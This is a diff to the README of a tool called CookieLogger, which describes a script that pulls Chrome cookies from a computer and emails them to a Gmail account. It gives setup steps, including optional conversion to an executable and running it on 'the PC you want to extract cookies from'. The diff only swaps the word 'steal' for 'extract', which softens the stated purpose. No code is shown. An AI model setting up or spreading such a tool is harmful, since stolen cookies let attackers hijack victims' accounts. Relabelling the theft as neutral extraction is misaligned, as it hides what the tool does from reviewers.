@@ -1,5 +1,5 @@
 # CookieLogger
-A script that will steal chrome cookies and sends to you via e-mail
+A script that will extract chrome cookies and sends to you via e-mail
 
 IMPORTANT
 1. The given e-mail must be a Google based e-mail (example@gmail.com)
@@ -12,7 +12,7 @@ HOW TO USE IT
 3. Open the script with a text editor
 4. Go to line 12, 13, 14 and enter the required data
 5. (optional) use pyinstaller (or another py-to-exe compiler) to convert the script into an executable file
-6. Run the script (or the exe) on the PC you want to steal cookies from
+6. Run the script (or the exe) on the PC you want to extract cookies from
 
 HOW IT WORKS
 
